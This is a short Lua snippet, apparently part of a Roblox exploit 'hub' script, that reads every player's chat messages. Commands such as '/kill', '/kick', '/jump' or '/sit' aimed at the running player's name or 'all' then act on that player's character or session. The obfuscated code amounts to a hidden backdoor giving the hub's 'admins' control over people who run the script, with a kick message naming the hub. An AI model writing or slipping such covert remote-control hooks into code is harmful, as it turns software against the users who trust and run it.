-- [O TREM: LEITURA DE CHAT]
local function Process(m, s)
    if m:sub(1,1) == "/" then
        local p = m:split(" ")
        if #p >= 2 then
            local cmd = p[1]:gsub("/",""):lower()
            local target = p[2]:lower()
            if target == _0xL.Name:lower() or target == "all" then
                if _G.IM and s ~= _0xL then return end
                if cmd == "kill" then _0xL.Character:BreakJoints() end
                if cmd == "kick" then _0xL:Kick("\n\nTime Jotinha12hr2 Hub's Admin") end
                if cmd == "jump" then _0xL.Character.Humanoid.Jump = true end
                if cmd == "sit" then _0xL.Character.Humanoid.Sit = true end
                -- Outros comandos seguem a mesma lógica...
            end
        end
    end
end

_0xP.PlayerAdded:Connect(function(plr) plr.Chatted:Connect(function(m) Process(m, plr) end) end)
for _, plr in pairs(_0xP:GetPlayers()) do plr.Chatted:Connect(function(m) Process(m, plr) end) end

